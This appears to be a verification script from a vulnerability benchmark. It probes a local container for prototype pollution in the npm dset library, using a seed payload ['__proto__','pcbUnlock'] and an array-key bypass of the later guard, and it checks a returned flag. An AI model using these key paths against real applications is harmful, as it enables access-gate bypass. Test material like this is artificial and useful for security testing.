#!/usr/bin/env bash
# PCBV2-0062 dset (CVE-2022-25645 seed / CVE-2024-21529 residual) -- 定制 verify.sh
#
# 机制: REAL npm `dset` faithful-core harness (GET /probe?spec=<JSON>)。请求把 spec 当作 dset()
#       key-path 在真实 per-version 发布字节上执行; 若 dset() 把 gate key 写到 Object.prototype
#       (GLOBAL 原型污染), 默认拒绝 gate 释放容器 env PCB_FLAG (start.sh 注入 RUN_FLAG=真 flag),
#       响应 JSON 的 gated_secret 字段回显该 flag; 否则 gated_secret="denied"。
#   seed    : spec=["__proto__","pcbUnlock"]  (字符串 key)
#               v0(dset@2.0.1, 无 guard) -> 污染 -> gated_secret=flag       rc=0
#               v1(dset@3.1.2, 字符串 guard 命中 '__proto__' break) -> denied rc=10
#   residual: spec=[["__proto__"],"pcbUnlock"]  (数组 key = 类型混淆)
#               v1(dset@3.1.2, strict === 不匹配数组 -> 绕过 guard) -> flag  rc=0
#               v2(dset@3.1.4, ''+k 先转字符串 -> guard 命中) -> denied      rc=10
# flag 通道: HTTP 响应 JSON gated_secret 字段 (容器 PCB_FLAG=真 flag)。
# 判定基准: RUN_FLAG (提交值)。正常 seed 时 RUN_FLAG=真 flag=容器 flag -> 命中 -> 0;
#           wrong/stale 检查时 RUN_FLAG=override != 容器真 flag (通道含真 flag) -> 10。
# 退出码: 0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail

: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }

CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# 动态解析 host 端口 (compose 固定映射或平台动态端口都适用)
HOSTPORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-8080}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | head -n1)"
PORT="${HOSTPORT##*:}"
[[ -n "${PORT:-}" ]] || { echo "port resolve failed for $VERSION" >&2; exit 20; }

if [[ "$MODE" == "--seed" ]]; then
  SPEC_JSON='["__proto__","pcbUnlock"]'
else
  SPEC_JSON='[["__proto__"],"pcbUnlock"]'
fi

"$PY" - "$PORT" "$RUN_FLAG" "$SPEC_JSON" <<'PYEOF'
import json, sys, urllib.error, urllib.parse, urllib.request

port, run_flag, spec_json = sys.argv[1], sys.argv[2], sys.argv[3]

url = "http://127.0.0.1:%s/probe?%s" % (port, urllib.parse.urlencode({"spec": spec_json}))
try:
    with urllib.request.urlopen(url, timeout=30) as r:
        raw = r.read().decode("utf-8", "replace")
except Exception as e:
    print("HTTP-ERROR: %r" % (e,))
    sys.exit(20)

try:
    d = json.loads(raw)
except Exception:
    print("BAD-JSON:", raw[:200])
    sys.exit(20)

print("version:", d.get("version"), "dset:", d.get("dset_version"),
      "polluted:", d.get("polluted"), "gated_secret:", d.get("gated_secret"))

# 判定: 效果通道 gated_secret == 提交值 RUN_FLAG
sys.exit(0 if (d.get("gated_secret") or "") == run_flag else 10)
PYEOF
exit $?
